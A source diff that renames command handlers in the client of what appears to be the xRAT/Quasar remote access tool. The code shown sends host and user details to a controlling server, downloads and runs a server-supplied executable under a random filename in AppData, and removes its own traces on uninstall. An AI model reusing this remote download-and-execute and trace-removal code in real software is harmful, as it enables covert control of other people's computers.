@@ -12,15 +12,15 @@ namespace xClient.Core.Commands
     /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT MANIPULATE THE CONNECTION. */
     public static partial class CommandHandler
     {
-        public static void HandleInitializeCommand(Packets.ServerPackets.InitializeCommand command, Client client)
+        public static void HandleGetAuthentication(Packets.ServerPackets.GetAuthentication command, Client client)
         {
             SystemCore.InitializeGeoIp();
-            new Packets.ClientPackets.Initialize(Settings.VERSION, SystemCore.OperatingSystem, SystemCore.AccountType,
+            new Packets.ClientPackets.GetAuthenticationResponse(Settings.VERSION, SystemCore.OperatingSystem, SystemCore.AccountType,
                 SystemCore.Country, SystemCore.CountryCode, SystemCore.Region, SystemCore.City, SystemCore.ImageIndex,
                 SystemCore.GetId(), SystemCore.GetUsername(), SystemCore.GetPcName()).Execute(client);
         }
 
-        public static void HandleUpdate(Packets.ServerPackets.Update command, Client client)
+        public static void HandleDoClientUpdate(Packets.ServerPackets.DoClientUpdate command, Client client)
         {
             // i dont like this updating... if anyone has a better idea feel free to edit it
             if (string.IsNullOrEmpty(command.DownloadURL))
@@ -36,14 +36,14 @@ namespace xClient.Core.Commands
 
                     if (!destFile.AppendBlock(command.Block, command.CurrentBlock))
                     {
-                        new Packets.ClientPackets.Status(string.Format("Writing failed: {0}", destFile.LastError)).Execute(
+                        new Packets.ClientPackets.SetStatus(string.Format("Writing failed: {0}", destFile.LastError)).Execute(
                             client);
                         return;
                     }
 
                     if ((command.CurrentBlock + 1) == command.MaxBlocks) // Upload finished
                     {
-                        new Packets.ClientPackets.Status("Updating...").Execute(client);
+                        new Packets.ClientPackets.SetStatus("Updating...").Execute(client);
 
                         SystemCore.UpdateClient(client, filePath);
                     }
@@ -51,7 +51,7 @@ namespace xClient.Core.Commands
                 catch (Exception ex)
                 {
                     DeleteFile(filePath);
-                    new Packets.ClientPackets.Status(string.Format("Update failed: {0}", ex.Message)).Execute(client);
+                    new Packets.ClientPackets.SetStatus(string.Format("Update failed: {0}", ex.Message)).Execute(client);
                 }
 
                 return;
@@ -59,7 +59,7 @@ namespace xClient.Core.Commands
 
             new Thread(() =>
             {
-                new Packets.ClientPackets.Status("Downloading file...").Execute(client);
+                new Packets.ClientPackets.SetStatus("Downloading file...").Execute(client);
 
                 string tempFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                     Helper.Helper.GetRandomFilename(12, ".exe"));
@@ -74,19 +74,19 @@ namespace xClient.Core.Commands
                 }
                 catch
                 {
-                    new Packets.ClientPackets.Status("Download failed!").Execute(client);
+                    new Packets.ClientPackets.SetStatus("Download failed!").Execute(client);
                     return;
                 }
 
-                new Packets.ClientPackets.Status("Updating...").Execute(client);
+                new Packets.ClientPackets.SetStatus("Updating...").Execute(client);
 
                 SystemCore.UpdateClient(client, tempFile);
             }).Start();
         }
 
-        public static void HandleUninstall(Packets.ServerPackets.Uninstall command, Client client)
+        public static void HandleDoClientUninstall(Packets.ServerPackets.DoClientUninstall command, Client client)
         {
-            new Packets.ClientPackets.Status("Uninstalling... bye ;(").Execute(client);
+            new Packets.ClientPackets.SetStatus("Uninstalling... bye ;(").Execute(client);
 
             SystemCore.RemoveTraces();
 
